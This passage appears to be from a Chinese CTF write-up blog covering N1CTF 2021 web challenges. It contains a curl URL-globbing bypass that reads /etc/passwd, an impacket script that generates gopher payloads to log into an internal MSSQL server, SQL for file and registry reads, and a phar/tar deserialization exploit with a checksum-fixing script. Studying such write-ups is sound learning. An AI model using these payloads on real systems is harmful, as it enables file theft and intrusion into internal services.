+        <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span>
+        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Check</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"/usr/bin/curl ${url} --output - -m 3 --connect-timeout 3"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"your command: "</span> <span class="token punctuation">.</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"you cannot get the result~"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>需要输出的结果中带有生成的uuid才能看到回显，并且在check函数里过滤了<code>lg</code>两个字符，理论上来说file和gopher协议就不可用了，然而真的是这样吗<br>还是翻手册，直接开curl的man手册，能看到如下内容</p>
+<blockquote>
+<p>You can specify multiple URLs or parts of URLs by writing part<br>sets within braces and quoting the URL as in:<br>“<a target="_blank" rel="external nofollow noopener noreferrer" href="http://site.{one,two,three}.com&quot;/">http://site.{one,two,three}.com&quot;</a><br>or you can get sequences of alphanumeric series by using [] as<br>in:<br>“<a href="ftp://ftp.example.com/file[1-100].txt&quot;" rel="external nofollow noopener noreferrer" target="_blank">ftp://ftp.example.com/file[1-100].txt&quot;</a><br>“<a href="ftp://ftp.example.com/file[001-100].txt&quot;" rel="external nofollow noopener noreferrer" target="_blank">ftp://ftp.example.com/file[001-100].txt&quot;</a>    (with leading zeros)<br>“<a href="ftp://ftp.example.com/file[a-z].txt&quot;" rel="external nofollow noopener noreferrer" target="_blank">ftp://ftp.example.com/file[a-z].txt&quot;</a></p>
+</blockquote>
+<p>支持一个中括号来表示范围，大括号来枚举内容，虽然例子里没有给，但是不如试试能不能用中括号来修改协议字段？<br><code>fi[k-m]e:///etc/passwd</code>，似乎完全可以，不过本地测试的时候这样子会报错说我中括号没闭合，非常奇怪，乱按一下，再加一个步长，顺利搞定<br><code>fi[j-m:2]e:///etc/passwd</code><br>并且会有类似于这样子的输出</p>
+<pre><code>[1/2]: fije:///etc/passwd --&gt; &lt;stdout&gt;
+--_curl_--fije:///etc/passwd
+curl: (6) Could not resolve host: fije
+
+[2/2]: file:///etc/passwd --&gt; &lt;stdout&gt;
+--_curl_--file:///etc/passwd
+root:x:0:0:root:/root:/bin/bash
+......
+</code></pre>
+<p>输入的文件名也被输出了出来，那么只要把token当做一个目录加进去，再跳出来即可先读取到注释中提到的hint.txt</p>
+<p>hint.txt是给出了一个内网的mssql账户和密码，而密码，是2k行的uuid。。。我一开始还以为是mssql的什么特殊加密方式，想了想感觉是出题人希望我们能自己写一个产生对应数据流的工具。。。去遍历这2k个密码</p>
+<p>思路倒是没什么问题，用gopher手搓数据流，然后自动化生成2000个对应的gopher包，总有一个能打通，至于回显问题，也很好解决，大括号不仅能枚举部分内容，还能直接枚举两个链接，就像这样<br><code>&#123;file:///etc/passwd,http://www.baidu.com&#125;</code><br>协议不同也没关系，所以可以自己vps上放个uuid，再用gopher打，也可以用之前提到的file会回显，整个目录打，也可以直接去读tmp下的那个session文件，方法很多</p>
+<p>那么接下来就是手搓数据了，先起了个mssql的docker（我一直以为这个东西只能在windows上跑来这），然后本地连一下看看情况，发现密码是密文传输的，并且每次的包还不一样，不能抄一个模板然后直接替换了。。。<br>然后，我去微软翻了一眼文档，然后被究极数据结构劝退，网上找python连mssql的库，有是有，但是他只负责连，也不能只生成数据，翻源码，发现这个玩意还编译到了字节码，翻不到。。。<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec">[MS-TDS]: Tabular Data Stream Protocol</a><br>然后最后只能docker起一个服务，然后用python去连，再写一个python脚本监听网卡。。。把数据抓出来。。。吐了</p>
+<p>可这并不是最惨的，因为搜一下gopher打mssql，发现几年前有一个类似的题，但是那个题的账户密码是已知的，就只要本地生成一个流量打过去就行了，所以工作量不大，可以手动，现在我需要自动化，在我把我写的破烂缝合起来自动化之后，我发现，我把流量缝合起来一整个gopher打过去之后，server给我应答了一个prelogin的响应包。。。按照网上的文章应该缝合起来一波就可以完成prelogin+login+query的。心态爆炸，躺平了</p>
+<p>嗯，看了出题人的官方wp，他自己手搓了这整个数据结构，那我也无话可说了，试了一下，确实能一个包打通，既然如此，就是我的缝合代码有问题了，不过出题人提到有一个叫impacket的库封装了这套数据结构，我直接抄过来缝合，并写出一套代码（出题人的脚本用python2写的，多多少少有点用不习惯，这个已经写好了整个数据结构的封装起来用应该也更灵活更鲁棒吧）</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> impacket<span class="token punctuation">.</span>tds <span class="token keyword">import</span> <span class="token operator">*</span>
+
+
+<span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%%%02x'</span> <span class="token operator">%</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">gene_packet</span><span class="token punctuation">(</span>packetType<span class="token punctuation">,</span> data<span class="token punctuation">,</span> packetID<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    tds <span class="token operator">=</span> TDSPacket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    tds<span class="token punctuation">[</span><span class="token string">'Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> packetType
+    tds<span class="token punctuation">[</span><span class="token string">'Status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TDS_STATUS_EOM
+    tds<span class="token punctuation">[</span><span class="token string">'PacketID'</span><span class="token punctuation">]</span> <span class="token operator">=</span> packetID
+    tds<span class="token punctuation">[</span><span class="token string">'Data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data
+    <span class="token keyword">return</span> tds
+
+
+username <span class="token operator">=</span> <span class="token string">"sa"</span>
+password <span class="token operator">=</span> <span class="token string">"9fb8da74-5186-4471-9ee5-155539f84e14"</span>
+<span class="token comment" spellcheck="true"># database = "master"</span>
+database <span class="token operator">=</span> None
+server <span class="token operator">=</span> <span class="token string">"ip"</span>
+port <span class="token operator">=</span> <span class="token number">1433</span>
+mssql <span class="token operator">=</span> MSSQL<span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+query <span class="token operator">=</span> <span class="token string">"SELECT 'HELLO WORLD!!'"</span>
+
+<span class="token comment" spellcheck="true"># prelogin packet</span>
+prelogin <span class="token operator">=</span> TDS_PRELOGIN<span class="token punctuation">(</span><span class="token punctuation">)</span>
+prelogin<span class="token punctuation">[</span><span class="token string">'Version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x08\x00\x01\x55\x00\x00"</span>
+prelogin<span class="token punctuation">[</span><span class="token string">'Encryption'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TDS_ENCRYPT_NOT_SUP
+prelogin<span class="token punctuation">[</span><span class="token string">'ThreadID'</span><span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;L'</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+prelogin<span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">'MSSQLServer\x00'</span>
+pre_tds <span class="token operator">=</span> gene_packet<span class="token punctuation">(</span>TDS_PRE_LOGIN<span class="token punctuation">,</span> prelogin<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># login packet</span>
+login <span class="token operator">=</span> TDS_LOGIN<span class="token punctuation">(</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'HostName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'AppName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'ServerName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mssql<span class="token punctuation">.</span>server<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'CltIntName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> login<span class="token punctuation">[</span><span class="token string">'AppName'</span><span class="token punctuation">]</span>
+login<span class="token punctuation">[</span><span class="token string">'ClientPID'</span><span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'PacketSize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mssql<span class="token punctuation">.</span>packetSize
+<span class="token keyword">if</span> database <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
+    login<span class="token punctuation">[</span><span class="token string">'Database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> database<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'OptionFlags2'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TDS_INIT_LANG_FATAL <span class="token operator">|</span> TDS_ODBC_ON
+login<span class="token punctuation">[</span><span class="token string">'UserName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'Password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mssql<span class="token punctuation">.</span>encryptPassword<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+login<span class="token punctuation">[</span><span class="token string">'SSPI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span>
+login_tds <span class="token operator">=</span> gene_packet<span class="token punctuation">(</span>TDS_LOGIN7<span class="token punctuation">,</span> login<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># query packet</span>
+query_tds <span class="token operator">=</span> gene_packet<span class="token punctuation">(</span>TDS_SQL_BATCH<span class="token punctuation">,</span> <span class="token punctuation">(</span>query <span class="token operator">+</span> <span class="token string">";-- -"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"gopher://"</span> <span class="token operator">+</span> server <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/_"</span> <span class="token operator">+</span> url_encode<span class="token punctuation">(</span>
+    pre_tds<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> login_tds<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> query_tds<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>嗯，成功连上了自己的docker并查询了数据，感觉是能用了，然后再从网上抄一个读文件的payload</p>
+<pre class=" language-mssql"><code class="language-mssql">create table result(res varchar(8000));
+bulk insert result from '/etc/passwd';
+select * from result
+</code></pre>
+<p>Linux上的docker就读这个好了。题目是读注册表，不知道是不是一个原理，不过起码应该后续不会有坑了，算打通了吧</p>
+<p>比赛的时候知道这个库就好了呜呜</p>
+<p>看了r3的wp，感觉他们这个题是一个外国友人做的？他在文章里提到他用impacket写的脚本并连不上最新的mssql，不过我的docker镜像感觉还蛮新的，他也没贴脚本，不知道出入在哪，不过他似乎提到密码是直接明文传输的？在密码长度一致的情况下也不需要对数据包进行额外更改，所以直接抓一个流量包然后替换密码字段也能重放。。。我之前一直以为会用进行简单加密，比如prelogin请求就是用来协商密钥之类的。。</p>
+<p>然后他给出了一个读注册表的命令</p>
+<pre class=" language-mssql"><code class="language-mssql">EXECUTE master.sys.xp_regenumvalues 'HKEY_LOCAL_MACHINE','Software\N1CTF2021'
+</code></pre>
+<h3 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h3><p>not easy at all<br>是一个玄幻的写入phar文件然后进行phar反序列化的操作<br>题目给了两个文件，一个index.php可以判断一个文件是否存在，以及一个类，在析构的时候echo flag</p>
+<pre class=" language-php"><code class="language-php">
+<span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">//include_once "flag.php";</span>
+<span class="token keyword">CLASS</span> <span class="token class-name">FLAG</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$_flag</span> <span class="token operator">=</span> <span class="token string">'n1ctf{************************}'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"FLAG: "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span>
+
+<span class="token keyword">include_once</span> <span class="token string">"log.php"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"file exist!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"file not exist!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token delimiter">?></span>
+</code></pre>
+<p>另一个log.php可以写文件，但是写入的内容有一些不可控数据，也不可控后缀</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'ROOT_PATH'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$log_type</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'log_type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$log_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$log_type</span> <span class="token operator">=</span> <span class="token string">"look"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$gets</span> <span class="token operator">=</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$real_ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$log_ip_dir</span> <span class="token operator">=</span> <span class="token constant">ROOT_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/log/'</span> <span class="token punctuation">.</span> <span class="token variable">$real_ip</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$log_ip_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$log_ip_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token string">'Time: '</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">' IP: ['</span> <span class="token punctuation">.</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'], REQUEST: ['</span> <span class="token punctuation">.</span> <span class="token variable">$gets</span> <span class="token punctuation">.</span> <span class="token string">'], CONTENT: ['</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input') . "]\n";</span>
+<span class="token variable">$log_file</span> <span class="token operator">=</span> <span class="token variable">$log_ip_dir</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$log_type</span> <span class="token punctuation">.</span> <span class="token string">'_www.log'</span><span class="token punctuation">;</span>
+
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$log_file</span><span class="token punctuation">,</span> <span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span>
+</code></pre>
+<p>我一开始是完全没有理解这种东西能怎么打，直接看都没看懂该怎么去触发，（完全忘了phar这一回事）确实，file_exist也是能触发phar的函数之一，不过这里写入常规的phar文件似乎是不能正常解析的，phar文件无论是前面还是后面被添加了额外的数据，似乎都会导致checksum检验不过（主要是我也不是很懂phar文件的文件格式。。。）</p>
+<p>wp中使用tar文件也能触发metadata的反序列化，而tar文件的格式比较简单且容易理解<br>tar文件在简单的打包情况下，就是以header1+content1+header2+content2+…+tar_end来构造的，并不具备压缩功能（甚至会占用更多的磁盘空间）<br>每一个块都是512字节的整数被，不足用\00补齐，最后用1024个\00表示tar结束<br>而tar的header由固定的数据结构组成</p>
+<pre class=" language-C"><code class="language-C">type Header struct {
+    name     [100]byte
+    mode     [8]byte
+    owner    [8]byte
+    group    [8]byte
+    size     [12]byte
+    mtime    [12]byte
+    checkSum [8]byte
+    fileType byte
+    linkName [100]byte
+    magic     [6]byte
+　　version     [2]byte
+　　uname     [32]byte
+　　gname     [32]byte
+　　devmajor [8]byte
+　　devminor [8]byte
+　　prefix   [155]byte
+　　padding  [12]byte
+}
+</code></pre>
+<p>其中name变量的长度有100个字节，也就意味着，如果我们的输入前的不可控字符串在100个以内，我们就能把前面的无效数据作为文件名。而因为tar遇到连续的1024个\00后就认为tar结束了，因此可控输入后的无效数据也不影响tar包的解析（如果超过100个字节但是还没影响到checksum的话不知道前面的数据奇怪一点会不会影响解析，感觉可能就size比较关键？），也许在更复杂的情况下可以更加精心的构造出符合tar的数据</p>
+<p>使用如下代码生成一个带metadata的tar包</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">CLASS</span> <span class="token class-name">FLAG</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"FLAG: "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"get_flag.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PharData</span><span class="token punctuation">(</span><span class="token string">"get_flag.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"filecontent"</span><span class="token punctuation">;</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>这个tar包实际上打包了两个文件，一个是我们的filename，另一个则是metadata，而这个metadata和phar中的metadata一样，再被phar协议处理时会触发反序列化</p>
+<p>再使用类似这样子的脚本去重新计算checksum</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> struct
+<span class="token comment" spellcheck="true"># use python2</span>
+
+<span class="token comment" spellcheck="true"># checksum的计算方法为除去checksum字段其他所有的512-8共504个字节的Ascii码相加的值再加上256</span>
+<span class="token keyword">def</span> <span class="token function">calc_checksum</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> sum<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>unpack_from<span class="token punctuation">(</span><span class="token string">"148B8x356B"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span>
+
+
+prefix <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token comment" spellcheck="true"># make it into phar format</span>
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload.tar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+new_name <span class="token operator">=</span> prefix<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+new_data <span class="token operator">=</span> new_name <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+checksum <span class="token operator">=</span> calc_checksum<span class="token punctuation">(</span>new_data<span class="token punctuation">)</span>
+new_checksum <span class="token operator">=</span> oct<span class="token punctuation">(</span>checksum<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\x00'</span>
+new_data <span class="token operator">=</span> new_name <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">:</span><span class="token number">148</span><span class="token punctuation">]</span> <span class="token operator">+</span> new_checksum <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">156</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>new_data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>prefix<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>既然tar的适应性这么强，考虑一下能不能在无法写文件的时候究极upload progress完成利用？<br>然后发现PHP要求phar协议解析的文件一定要有一个后缀名（是啥都行），不然就会把那个文件当做目录来看待而报错。。。</p>
+<p>还有一件事，PHP（在某一个版本或者是从PHP8开始）已经停止了在文件流操作时自动反序列化metadata数据，也就是说经典反序列化在最新版本下已经没有用了，PHP真是越来越安全了</p>
+<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>等wping，还有好多东西没写，搞不动了<br>躺会</p>
+<p>今天更新的时候发现typora怎么突然收费了呢？不更新&#x3D;&#x3D;&#x3D;永久免费</p>
